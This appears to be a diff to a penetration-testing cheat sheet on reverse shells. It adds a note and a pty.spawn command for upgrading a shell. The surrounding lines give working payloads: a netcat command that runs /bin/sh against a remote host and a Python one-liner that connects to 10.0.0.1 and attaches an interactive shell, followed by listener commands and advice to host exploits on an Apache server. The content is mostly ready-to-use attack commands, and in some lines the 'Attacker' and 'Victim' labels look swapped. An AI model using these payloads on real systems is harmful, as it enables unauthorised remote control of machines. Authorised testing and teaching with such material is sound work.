@@ -58,7 +58,10 @@ Attacker:nc 192.168.1.102 4444 -e /bin/sh <br>
 Victim:nc -lvp 4444 <br>
 Attacker:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br>
 Victim:nc -lvp 1234<br>
-
+Note:In the above payload python will run and creating bash shell.But while sometimes trying to put commands it throws error like you have to run through terminal.For that Run Below command to work properly<br>
+<br>
+python3 -c 'import pty; pty.spawn("/bin/sh")'<br>
+<br>
 **File transfer during REVERSE SHELL**<br>
 Attacker: service apache2 start<br>
 place shell or exploit in /var/www/html<br>
